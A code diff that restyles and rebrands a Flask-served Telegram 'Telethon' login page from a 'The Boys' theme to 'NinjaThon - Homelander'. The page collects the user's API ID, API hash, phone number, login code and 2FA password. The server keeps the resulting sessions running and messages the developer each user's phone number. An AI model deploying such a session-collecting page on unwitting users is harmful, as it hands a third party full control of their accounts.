@@ -21,553 +21,178 @@ def home():
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>The Boys - Telethon Setup</title>
+<title>NinjaThon - Homelander</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap');
 
   :root {
-    --bg:#0a0a14;
-    --panel:linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-    --panel-solid:#1a1a2e;
-    --panel-hi:linear-gradient(135deg, #1e1e32 0%, #1a2744 100%);
-    --line:rgba(220,38,38,0.15);
-    --line-hi:rgba(220,38,38,0.3);
-    --text:#ffffff;
-    --text-dim:rgba(255,255,255,0.7);
-    --text-faint:rgba(255,255,255,0.45);
-    --accent:#dc2626;
-    --accent-blue:#3b82f6;
-    --accent-dim:rgba(220,38,38,0.15);
-    --ok:#10b981;
-    --err:#ef4444;
-    --gold:#fbbf24;
-    --r:12px;
-    --r2:20px;
+    --bg:#0A0A0B; --panel:#131316; --panel-hi:#18181C;
+    --line:rgba(255,255,255,0.08); --line-hi:rgba(255,255,255,0.16);
+    --text:#F2F2F3; --text-dim:rgba(242,242,243,0.55); --text-faint:rgba(242,242,243,0.32);
+    --accent:#5B8CFF; --accent-dim:rgba(91,140,255,0.12);
+    --ok:#3FB871; --err:#E5534B;
+    --r:10px; --r2:16px;
   }
-  
   * { margin:0; padding:0; box-sizing:border-box; }
-  
+  html, body { background:var(--bg); }
   body {
     font-family:'Inter',-apple-system,BlinkMacSystemFont,system-ui,sans-serif;
-    color:var(--text);
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:24px;
-    -webkit-font-smoothing:antialiased;
-    background: 
-      radial-gradient(ellipse at 20% 50%, rgba(220,38,38,0.08) 0%, transparent 50%),
-      radial-gradient(ellipse at 80% 50%, rgba(59,130,246,0.08) 0%, transparent 50%),
-      radial-gradient(ellipse at 50% 0%, rgba(251,191,36,0.05) 0%, transparent 50%),
-      var(--bg);
-    position:relative;
-    overflow:hidden;
-  }
-  
-  /* Stars background */
-  body::before {
-    content:'';
-    position:fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    background-image: 
-      radial-gradient(1px 1px at 10% 20%, rgba(255,255,255,0.3), transparent),
-      radial-gradient(1px 1px at 20% 60%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1.5px 1.5px at 30% 40%, rgba(255,255,255,0.4), transparent),
-      radial-gradient(1px 1px at 40% 10%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1.5px 1.5px at 50% 70%, rgba(255,255,255,0.3), transparent),
-      radial-gradient(1px 1px at 60% 30%, rgba(255,255,255,0.25), transparent),
-      radial-gradient(1px 1px at 70% 80%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1.5px 1.5px at 80% 50%, rgba(255,255,255,0.35), transparent),
-      radial-gradient(1px 1px at 90% 15%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 15% 85%, rgba(255,255,255,0.15), transparent),
-      radial-gradient(1px 1px at 85% 90%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1.5px 1.5px at 25% 25%, rgba(255,255,255,0.3), transparent),
-      radial-gradient(1px 1px at 55% 45%, rgba(255,255,255,0.25), transparent),
-      radial-gradient(1px 1px at 65% 65%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 45% 85%, rgba(255,255,255,0.15), transparent);
-    pointer-events:none;
-    z-index:0;
-    animation: twinkle 4s ease-in-out infinite alternate;
-  }
-  
-  @keyframes twinkle {
-    0% { opacity: 0.7; }
-    100% { opacity: 1; }
-  }
-  
-  .wrap { 
-    width:100%; 
-    max-width:440px; 
-    display:flex; 
-    flex-direction:column; 
-    gap:16px;
-    position:relative;
-    z-index:1;
+    color:var(--text); min-height:100vh;
+    display:flex; align-items:center; justify-content:center;
+    padding:24px; -webkit-font-smoothing:antialiased;
   }
 
-  .hd { 
-    text-align:center; 
-    margin-bottom:8px;
-    position:relative;
+  .wrap { width:100%; max-width:420px; display:flex; flex-direction:column; gap:16px; }
+
+  .hd { text-align:center; margin-bottom:4px; }
+  .mark {
+    width:48px; height:48px; margin:0 auto 18px; border-radius:12px;
+    background:var(--panel-hi); border:1px solid var(--line);
+    display:flex; align-items:center; justify-content:center;
   }
-  
-  .logo-section {
-    position:relative;
-    display:inline-block;
-    margin-bottom:8px;
-  }
-  
-  .logo-ring {
-    width:80px;
-    height:80px;
-    margin:0 auto;
-    border-radius:50%;
-    background: linear-gradient(135deg, #dc2626 0%, #1e3a8a 50%, #fbbf24 100%);
-    padding:3px;
-    box-shadow: 0 0 30px rgba(220,38,38,0.3), 0 0 60px rgba(59,130,246,0.2);
-    animation: ringPulse 2s ease-in-out infinite;
-  }
-  
-  @keyframes ringPulse {
-    0%, 100% { box-shadow: 0 0 30px rgba(220,38,38,0.3), 0 0 60px rgba(59,130,246,0.2); }
-    50% { box-shadow: 0 0 50px rgba(220,38,38,0.5), 0 0 80px rgba(59,130,246,0.4); }
-  }
-  
-  .logo-inner {
-    width:100%;
-    height:100%;
-    border-radius:50%;
-    background: linear-gradient(135deg, #0a0a14 0%, #1a1a2e 100%);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    position:relative;
-    overflow:hidden;
-  }
-  
-  .logo-inner::before {
-    content:'';
-    position:absolute;
-    width:200%;
-    height:200%;
-    background: conic-gradient(from 0deg, transparent, rgba(220,38,38,0.2), transparent, rgba(59,130,246,0.2), transparent);
-    animation: rotate 4s linear infinite;
-  }
-  
-  @keyframes rotate {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-  
-  .logo-text {
-    position:relative;
-    z-index:1;
-    font-size:32px;
-    font-weight:800;
-    background: linear-gradient(135deg, #dc2626, #fbbf24);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-    background-clip:text;
-    font-family:'JetBrains Mono', monospace;
-  }
-  
-  .hd h1 { 
-    font-size:24px; 
-    font-weight:800; 
-    letter-spacing:-0.5px; 
-    margin-bottom:6px;
-    background: linear-gradient(135deg, #ffffff 0%, #93c5fd 50%, #fbbf24 100%);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-    background-clip:text;
-  }
-  
-  .hd .subtitle { 
-    font-size:14px; 
-    color:var(--text-dim); 
-    line-height:1.5;
-    font-weight:500;
-  }
-  
+  .mark svg { width:22px; height:22px; }
+  .hd h1 { font-size:19px; font-weight:600; letter-spacing:-0.2px; margin-bottom:6px; }
+  .hd p { font-size:13px; color:var(--text-faint); line-height:1.5; }
+
   .card {
-    background: var(--panel-solid);
-    border:1px solid var(--line);
-    border-radius:var(--r2);
-    padding:28px;
-    position:relative;
-    backdrop-filter:blur(20px);
-    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-  }
-  
-  .card::before {
-    content:'';
-    position:absolute;
-    top:-1px;
-    left:-1px;
-    right:-1px;
-    bottom:-1px;
-    border-radius:var(--r2);
-    background: linear-gradient(135deg, rgba(220,38,38,0.3), transparent, rgba(59,130,246,0.3));
-    z-index:-1;
-    opacity:0.5;
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2);
+    padding:24px; position:relative;
   }
 
   .step-head {
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    margin-bottom:24px;
+    display:flex; align-items:center; justify-content:space-between; margin-bottom:20px;
   }
-  
   .step-text {
-    font-family:'JetBrains Mono',monospace;
-    font-size:11px;
-    font-weight:600;
-    color:var(--text-faint);
-    text-transform:uppercase;
-    letter-spacing:1px;
-    background: rgba(220,38,38,0.1);
-    padding:4px 12px;
-    border-radius:20px;
-    border:1px solid rgba(220,38,38,0.2);
+    font-family:'JetBrains Mono',monospace; font-size:11px; font-weight:500;
+    color:var(--text-faint); text-transform:uppercase; letter-spacing:.8px;
   }
 
   .back-btn {
-    display:inline-flex;
-    align-items:center;
-    gap:5px;
-    background:none;
-    border:none;
-    color:var(--text-dim);
-    font-size:13px;
-    font-weight:500;
-    cursor:pointer;
-    padding:6px 12px;
-    transition:all .15s;
-    border-radius:8px;
+    display:inline-flex; align-items:center; gap:5px;
+    background:none; border:none; color:var(--text-dim); font-size:13px; font-weight:500;
+    cursor:pointer; padding:2px 0; transition:color .15s;
   }
-  .back-btn:hover { 
-    color:var(--text);
-    background: rgba(255,255,255,0.05);
-  }
+  .back-btn:hover { color:var(--text); }
   .back-btn svg { width:14px; height:14px; }
 
-  .field { 
-    margin-bottom:16px;
-    position:relative;
-  }
-  
+  .field { margin-bottom:14px; position:relative; }
   .field label {
-    display:block;
-    font-size:13px;
-    font-weight:600;
-    color:var(--text-dim);
-    margin-bottom:8px;
-    letter-spacing:0.3px;
+    display:block; font-size:12.5px; font-weight:500; color:var(--text-dim); margin-bottom:6px;
   }
-  
-  .input-wrapper {
-    position:relative;
-  }
-  
+  .input-row { position:relative; display:flex; align-items:center; }
   .field input {
-    width:100%;
-    padding:12px 44px 12px 14px;
-    background:rgba(255,255,255,0.03);
-    border:1px solid var(--line);
-    border-radius:var(--r);
-    color:var(--text);
-    font-size:15px;
-    font-weight:500;
-    font-family:inherit;
-    outline:none;
-    transition:all .2s;
-    letter-spacing:0.3px;
+    width:100%; padding:11px 42px 11px 12px; background:var(--panel-hi);
+    border:1px solid var(--line); border-radius:var(--r); color:var(--text);
+    font-size:14.5px; font-weight:500; font-family:inherit; outline:none;
+    transition:border-color .15s, background .15s;
   }
-  
-  .field input::placeholder { 
-    color:var(--text-faint);
-    font-weight:400;
-  }
-  
-  .field input:focus { 
-    border-color:var(--accent);
-    background:rgba(220,38,38,0.05);
-    box-shadow: 0 0 20px rgba(220,38,38,0.1);
-  }
-  
+  .field input::placeholder { color:var(--text-faint); }
+  .field input:focus { border-color:var(--accent); background:rgba(91,140,255,0.05); }
   #code {
-    font-family:'JetBrains Mono',monospace;
-    font-size:18px;
-    font-weight:700;
-    letter-spacing:8px;
-    text-align:center;
+    font-family:'JetBrains Mono',monospace; font-size:17px; font-weight:600; letter-spacing:5px;
   }
 
   .toggle-vis {
-    position:absolute;
-    right:8px;
-    top:50%;
-    transform:translateY(-50%);
-    background:none;
-    border:none;
-    cursor:pointer;
-    padding:8px;
-    line-height:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    opacity:0.45;
-    transition:all .15s;
-    width:34px;
-    height:34px;
+    position:absolute; right:8px; top:50%; transform:translateY(-50%);
+    background:none; border:none; cursor:pointer; padding:6px; line-height:0;
+    display:flex; align-items:center; justify-content:center;
+    opacity:.45; transition:opacity .15s; width:32px; height:32px;
     z-index:2;
-    border-radius:8px;
   }
-  .toggle-vis:hover { 
-    opacity:1;
-    background:rgba(255,255,255,0.05);
+  .toggle-vis:hover { opacity:.9; }
+  .toggle-vis svg { width:16px; height:16px; stroke:var(--text-dim); stroke-width:2; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+
+  .credential-steps { list-style:none; counter-reset:step; margin:2px 0 0; }
+  .credential-steps li {
+    counter-increment:step; font-size:12.5px; color:var(--text-faint); line-height:1.7;
+    padding-left:20px; position:relative; margin-bottom:4px;
   }
-  .toggle-vis svg { 
-    width:16px;
-    height:16px;
-    stroke:var(--text-dim);
-    stroke-width:2;
-    fill:none;
-    stroke-linecap:round;
-    stroke-linejoin:round;
+  .credential-steps li::before {
+    content:counter(step); position:absolute; left:0; top:1px;
+    font-family:'JetBrains Mono',monospace; font-size:11px; font-weight:600; color:var(--text-dim);
   }
+  .credential-steps strong { color:var(--text-dim); font-weight:600; }
+
+  .link-row { display:flex; gap:8px; margin-top:14px; }
+  .link-row a {
+    flex:1; display:flex; align-items:center; justify-content:center; gap:6px;
+    padding:9px 10px; background:var(--panel-hi); border:1px solid var(--line); border-radius:8px;
+    color:var(--text-dim); font-size:12.5px; font-weight:600; text-decoration:none; transition:all .15s;
+  }
+  .link-row a:hover { border-color:var(--line-hi); color:var(--text); }
+  .link-row a svg { width:14px; height:14px; flex-shrink:0; }
 
   .btn {
-    width:100%;
-    padding:14px;
-    border:none;
-    border-radius:var(--r);
-    font-size:15px;
-    font-weight:700;
-    font-family:'Inter',sans-serif;
-    cursor:pointer;
-    position:relative;
-    overflow:hidden;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-    transition:all .2s;
-    margin-top:8px;
-    letter-spacing:0.5px;
-    text-transform:uppercase;
+    width:100%; padding:12px; border:none; border-radius:var(--r); font-size:14px; font-weight:600;
+    font-family:'Inter',sans-serif; cursor:pointer; position:relative; overflow:hidden;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    transition:opacity .15s, transform .1s; margin-top:4px;
   }
-  .btn:active { transform:scale(0.98); }
-  
-  .btn-primary { 
-    background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
-    color:#ffffff;
-    box-shadow: 0 4px 15px rgba(220,38,38,0.3);
-    border:1px solid rgba(255,255,255,0.1);
-  }
-  .btn-primary:hover { 
-    box-shadow: 0 6px 25px rgba(220,38,38,0.5);
-    background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-  }
-  
+  .btn:active { transform:scale(.985); }
+  .btn-primary { background:var(--text); color:#0A0A0B; }
+  .btn-primary:hover { opacity:.9; }
   .btn .prog-bar {
-    position:absolute;
-    bottom:0;
-    left:0;
-    height:3px;
-    background:rgba(255,255,255,0.5);
-    width:0%;
-    transition:width .05s linear;
-    border-radius:0 0 var(--r) var(--r);
+    position:absolute; bottom:0; left:0; height:2px; background:rgba(0,0,0,.25); width:0%; transition:width .05s linear;
   }
-  
-  .btn.loading { 
-    pointer-events:none;
-    color:transparent;
-  }
+  .btn.loading { pointer-events:none; color:transparent; }
   .btn.loading::before {
-    content:'';
-    position:absolute;
-    top:50%;
-    left:50%;
-    width:18px;
-    height:18px;
-    margin:-9px 0 0 -9px;
-    border:2px solid rgba(255,255,255,0.2);
-    border-top-color:#ffffff;
-    border-radius:50%;
-    animation:spin .7s linear infinite;
+    content:''; position:absolute; top:50%; left:50%; width:16px; height:16px;
+    margin:-8px 0 0 -8px; border:2px solid rgba(0,0,0,.2);
+    border-top-color:#0A0A0B; border-radius:50%; animation:spin .7s linear infinite;
   }
 
   .result {
-    display:none;
-    margin-top:14px;
-    padding:12px 16px;
-    border-radius:var(--r);
-    font-size:13px;
-    font-weight:600;
-    text-align:center;
-    letter-spacing:0.3px;
+    display:none; margin-top:12px; padding:10px 13px; border-radius:var(--r);
+    font-size:12.5px; font-weight:500; text-align:center;
   }
   .result.show { display:block; }
-  .result.ok { 
-    background:rgba(16,185,129,0.1);
-    border:1px solid rgba(16,185,129,0.3);
-    color:var(--ok);
-  }
-  .result.err { 
-    background:rgba(239,68,68,0.1);
-    border:1px solid rgba(239,68,68,0.3);
-    color:var(--err);
-  }
+  .result.ok  { background:rgba(63,184,113,0.1); border:1px solid rgba(63,184,113,0.25); color:var(--ok); }
+  .result.err { background:rgba(229,83,75,0.1); border:1px solid rgba(229,83,75,0.25); color:var(--err); }
 
   .info-card {
-    background: var(--panel-solid);
-    border:1px solid var(--line);
-    border-radius:var(--r2);
-    padding:20px 22px;
-    backdrop-filter:blur(20px);
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2); padding:18px 20px;
   }
-  .info-card h3 { 
-    font-size:13px;
-    font-weight:700;
-    color:var(--text-dim);
-    margin-bottom:12px;
-    display:flex;
-    align-items:center;
-    gap:8px;
-  }
-  .info-card p { 
-    font-size:13px;
-    color:var(--text-faint);
-    line-height:1.7;
-  }
-  .info-card strong { 
-    color:var(--accent);
-    font-weight:600;
-  }
+  .info-card h3 { font-size:12.5px; font-weight:600; color:var(--text-dim); margin-bottom:10px; }
+  .info-card p { font-size:12.5px; color:var(--text-faint); line-height:1.7; }
+  .info-card strong { color:var(--text-dim); font-weight:600; }
   .info-card a {
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    margin-top:14px;
-    padding:10px 14px;
-    background:rgba(220,38,38,0.1);
-    border:1px solid rgba(220,38,38,0.3);
-    border-radius:10px;
-    color:var(--text);
-    font-size:13px;
-    font-weight:600;
-    text-decoration:none;
-    transition:all .15s;
+    display:inline-flex; align-items:center; gap:6px; margin-top:12px; padding:9px 12px;
+    background:var(--panel-hi); border:1px solid var(--line); border-radius:8px;
+    color:var(--text-dim); font-size:12.5px; font-weight:600; text-decoration:none; transition:all .15s;
   }
-  .info-card a:hover { 
-    background:rgba(220,38,38,0.2);
-    border-color:var(--accent);
-  }
+  .info-card a:hover { border-color:var(--line-hi); color:var(--text); }
   .info-card a svg { width:14px; height:14px; }
 
   .footer-links {
-    display:flex;
-    gap:10px;
-    justify-content:center;
-    margin-top:4px;
+    display:flex; gap:8px; justify-content:center; margin-top:4px;
   }
   .footer-links a {
-    flex:1;
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-    gap:6px;
-    padding:10px 14px;
-    background: var(--panel-solid);
-    border:1px solid var(--line);
-    border-radius:12px;
-    color:var(--text-dim);
-    font-size:12px;
-    font-weight:600;
-    text-decoration:none;
-    transition:all .15s;
-    backdrop-filter:blur(20px);
+    flex:1; display:inline-flex; align-items:center; justify-content:center; gap:6px;
+    padding:9px 12px; background:var(--panel); border:1px solid var(--line);
+    border-radius:10px; color:var(--text-dim); font-size:12px; font-weight:500;
+    text-decoration:none; transition:all .15s;
   }
-  .footer-links a:hover { 
-    border-color:var(--accent);
-    color:var(--text);
-    background:rgba(220,38,38,0.1);
-    box-shadow: 0 4px 15px rgba(220,38,38,0.2);
-  }
+  .footer-links a:hover { border-color:var(--line-hi); color:var(--text); background:var(--panel-hi); }
   .footer-links a svg { width:14px; height:14px; flex-shrink:0; }
-
-  .success-overlay {
-    display:none;
-    position:fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    background:rgba(10,10,20,0.95);
-    z-index:1000;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    gap:20px;
-  }
-  .success-overlay.show {
-    display:flex;
-    animation: fadeIn 0.3s ease;
-  }
-  @keyframes fadeIn {
-    from { opacity:0; }
-    to { opacity:1; }
-  }
-  .success-icon {
-    font-size:80px;
-    animation: bounce 0.6s ease;
-  }
-  @keyframes bounce {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.2); }
-  }
-  .success-text {
-    font-size:28px;
-    font-weight:800;
-    background: linear-gradient(135deg, #dc2626, #fbbf24);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-    background-clip:text;
-  }
-  .success-sub {
-    color:var(--text-dim);
-    font-size:16px;
-  }
 
   .hidden { display:none; }
 
   @keyframes spin { to { transform:rotate(360deg); } }
 
-  @media (prefers-reduced-motion: reduce) { 
-    * { animation:none !important; transition:none !important; } 
-  }
+  @media (prefers-reduced-motion: reduce) { * { animation:none !important; transition:none !important; } }
 </style>
 </head>
 <body>
 
 <div class="wrap">
   <div class="hd">
-    <div class="logo-section">
-      <div class="logo-ring">
-        <div class="logo-inner">
-          <span class="logo-text">V</span>
-        </div>
-      </div>
+    <div class="mark">
+      <svg viewBox="0 0 24 24" fill="var(--text)" stroke="none">
+        <polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26"/>
+      </svg>
     </div>
-    <h1>The Boys</h1>
-    <p class="subtitle">Vought International - Telethon Setup</p>
+    <h1>NinjaThon - Homelander</h1>
+    <p>Connect your Telegram account with power</p>
   </div>
 
   <div class="card">
@@ -575,8 +200,8 @@ def home():
       <div class="step-head"><span class="step-text">Step 1 of 2</span></div>
       <div class="field">
         <label>API ID</label>
-        <div class="input-wrapper">
-          <input id="api_id" type="password" placeholder="Enter your API ID" inputmode="numeric" autocomplete="off">
+        <div style="position:relative;">
+          <input id="api_id" type="password" placeholder="12345678" inputmode="numeric" autocomplete="off">
           <button class="toggle-vis" onclick="toggleVisibility('api_id', this)" title="Show/Hide">
             <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
             <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
@@ -585,8 +210,8 @@ def home():
       </div>
       <div class="field">
         <label>API Hash</label>
-        <div class="input-wrapper">
-          <input id="api_hash" type="password" placeholder="Enter your API Hash" autocomplete="off">
+        <div style="position:relative;">
+          <input id="api_hash" type="password" placeholder="0123456789abcdef..." autocomplete="off">
           <button class="toggle-vis" onclick="toggleVisibility('api_hash', this)" title="Show/Hide">
             <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
             <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
@@ -595,7 +220,7 @@ def home():
       </div>
       <div class="field">
         <label>Phone Number</label>
-        <div class="input-wrapper">
+        <div style="position:relative;">
           <input id="phone" type="password" placeholder="+201234567890" inputmode="tel" autocomplete="off">
           <button class="toggle-vis" onclick="toggleVisibility('phone', this)" title="Show/Hide">
             <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
@@ -604,7 +229,7 @@ def home():
         </div>
       </div>
       <button class="btn btn-primary" id="sendBtn" onclick="sendCode()">
-        <span class="btn-label">Send Code</span>
+        <span class="btn-label">Send code</span>
         <div class="prog-bar" id="prog1"></div>
       </button>
     </div>
@@ -618,9 +243,9 @@ def home():
         <span class="step-text">Step 2 of 2</span>
       </div>
       <div class="field">
-        <label>Login Code</label>
-        <div class="input-wrapper">
-          <input id="code" type="password" placeholder="•••••" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+        <label>Login code</label>
+        <div style="position:relative;">
+          <input id="code" type="password" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
           <button class="toggle-vis" onclick="toggleVisibility('code', this)" title="Show/Hide">
             <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
             <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
@@ -628,9 +253,9 @@ def home():
         </div>
       </div>
       <div class="field">
-        <label>2FA Password <span style="color:var(--text-faint);font-weight:400;">(if enabled)</span></label>
-        <div class="input-wrapper">
-          <input id="password" type="password" placeholder="••••••••" autocomplete="current-password">
+        <label>2FA password <span style="color:var(--text-faint);font-weight:400;">(optional)</span></label>
+        <div style="position:relative;">
+          <input id="password" type="password" placeholder="........" autocomplete="current-password">
           <button class="toggle-vis" onclick="toggleVisibility('password', this)" title="Show/Hide">
             <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
             <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
@@ -638,7 +263,7 @@ def home():
         </div>
       </div>
       <button class="btn btn-primary" id="verifyBtn" onclick="verify()">
-        <span class="btn-label">Activate Supe Powers</span>
+        <span class="btn-label">Verify and activate</span>
         <div class="prog-bar" id="prog2"></div>
       </button>
     </div>
@@ -647,8 +272,8 @@ def home():
   </div>
 
   <div class="info-card">
-    <h3>🔑 Get Your API Credentials</h3>
-    <p>Go to <strong>my.telegram.org</strong>, login with your Telegram account, navigate to <strong>API development tools</strong>, and create an application to receive your <strong>api_id</strong> and <strong>api_hash</strong>.</p>
+    <h3>Where do I get these credentials?</h3>
+    <p>Visit <strong>my.telegram.org</strong>, sign in, open <strong>API development tools</strong>, and create an app to get your <strong>api_id</strong> and <strong>api_hash</strong>.</p>
     <a href="https://my.telegram.org/apps" target="_blank">
       <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
       Open my.telegram.org
@@ -658,19 +283,13 @@ def home():
   <div class="footer-links">
     <a href="https://t.me/i_v_k_i" target="_blank">
       <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
-      Vought Channel
+      Source Channel
     </a>
     <a href="https://t.me/J0E_3" target="_blank">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-      Homelander
+      Developer
     </a>
   </div>
-</div>
-
-<div class="success-overlay" id="successOverlay">
-  <div class="success-icon">🦸‍♂️</div>
-  <div class="success-text">You're a Supe Now!</div>
-  <div class="success-sub">Vought International welcomes you, Homelander</div>
 </div>
 
 <script>
@@ -720,7 +339,7 @@ async function sendCode() {
   const api_id = $('api_id').value.trim();
   const api_hash = $('api_hash').value.trim();
   const phone = $('phone').value.trim();
-  if (!api_id || !api_hash || !phone) { showResult('All fields are required, Supe.', false); return; }
+  if (!api_id || !api_hash || !phone) { showResult('Please complete all fields.', false); return; }
   const btn = $('sendBtn');
   btn.classList.add('loading');
   const prog = runProgress('prog1', 3000);
@@ -737,16 +356,16 @@ async function sendCode() {
       if (data.status === 'code_sent') {
         $('step1').classList.add('hidden');
         $('step2').classList.remove('hidden');
-        showResult('Verification code sent. Check your Telegram.', true);
+        showResult('Code sent — check your Telegram app.', true);
       } else {
-        showResult('Already connected to Vought International.', true);
+        showResult('Session already active.', true);
       }
     } else {
-      showResult(data.message || 'Vought systems error.', false);
+      showResult(data.message || 'Something went wrong.', false);
     }
   } catch(e) {
     prog.finish();
-    showResult('Connection error. Vought servers may be busy.', false);
+    showResult('Connection error. Please try again.', false);
   } finally {
     btn.classList.remove('loading');
   }
@@ -755,7 +374,7 @@ async function sendCode() {
 async function verify() {
   const code = $('code').value.trim();
   const password = $('password').value;
-  if (!code) { showResult('Enter the verification code, Supe.', false); return; }
+  if (!code) { showResult('Enter the verification code.', false); return; }
   const btn = $('verifyBtn');
   btn.classList.add('loading');
   const prog = runProgress('prog2', 3500);
@@ -768,15 +387,14 @@ async function verify() {
     const data = await res.json();
     prog.finish();
     if (data.status === 'success') {
-      showResult('Compound V activated! Welcome to The Seven.', true);
-      $('successOverlay').classList.add('show');
-      setTimeout(() => { location.reload(); }, 3000);
+      showResult('Account activated.', true);
+      setTimeout(() => { location.reload(); }, 2500);
     } else {
-      showResult(data.message || 'Activation failed', false);
+      showResult(data.message || 'Verification failed', false);
     }
   } catch(e) {
     prog.finish();
-    showResult('Connection error. Try again.', false);
+    showResult('Connection error. Please try again.', false);
   } finally {
     btn.classList.remove('loading');
   }
@@ -874,9 +492,9 @@ def api_verify():
             
             await save_all_sessions()
             start_client_in_background(client, phone)
-            await notify_dev(f"New Supe activated: {phone}")
+            await notify_dev(f"New user activated: {phone}")
             
-            return jsonify({"status": "success", "message": "You are now a Supe! Welcome to Vought International."})
+            return jsonify({"status": "success", "message": "Account activated successfully"})
         except Exception as e:
             logger.error(f"Verification error: {e}")
             return jsonify({"status": "error", "message": str(e)}), 400
@@ -907,7 +525,7 @@ if __name__ == '__main__':
         logger.error(f"Failed to load sessions: {e}")
 
     def handle_shutdown(signum, frame):
